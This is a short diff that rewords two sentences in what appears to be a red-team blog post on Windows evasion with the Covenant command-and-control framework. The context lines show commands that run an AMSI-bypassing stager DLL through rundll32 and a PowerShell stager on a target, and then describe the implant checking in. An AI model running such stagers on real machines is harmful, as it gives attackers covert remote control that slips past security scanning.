@@ -636,7 +636,7 @@ Now build the project then copy the DLL to the target machine and execute with _
 rundll32 covenant-DLL-noAmsi.dll,MonkEntry
 ```
 
-Now you should have your shell on Covenant.
+Now you should have your Grunt checking in on Covenant.
 
 <p align="center">
   <img src="/assets/posts/2021-03-01-Windows-Evasion/cov3.JPG">
@@ -658,7 +658,8 @@ PS > [MonkStager.MonkStager]::Execute()
   <img src="/assets/posts/2021-03-01-Windows-Evasion/cov5.JPG">
 </p>
 
-And note the Grunt checking in:
+And note your new powershell Grunt checking in on Covenant.
+
 
 <p align="center">
   <img src="/assets/posts/2021-03-01-Windows-Evasion/cov4.JPG">
